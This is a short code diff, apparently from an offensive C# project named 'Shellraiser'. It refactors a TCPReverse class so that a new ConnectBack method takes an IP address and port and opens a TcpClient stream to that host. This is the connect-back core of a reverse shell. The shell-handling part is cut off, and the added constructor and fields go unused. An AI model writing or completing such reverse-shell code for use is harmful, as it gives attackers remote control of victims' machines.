@@ -10,11 +10,21 @@ using System.Threading.Tasks;
 
 namespace Shellraiser
 {
-	class TCPReverse
+	public class TCPReverse
 	{
-		public static void Main(string[] args)
+        private string iPAddress;
+        private object port;
+
+        public TCPReverse(string iPAddress, object port)
+        {
+            this.iPAddress = iPAddress;
+            this.port = port;
+        }
+
+        // Let's make the method take IPAddress and Port, we will make these variables from parsing the args
+        public static void ConnectBack(string IPAddress, int Port)
 		{
-			using (TcpClient client = new TcpClient(args[0], int.Parse(args[1])))
+			using (TcpClient client = new TcpClient(IPAddress, Port))
 			{
 				using (Stream stream = client.GetStream())
 				{
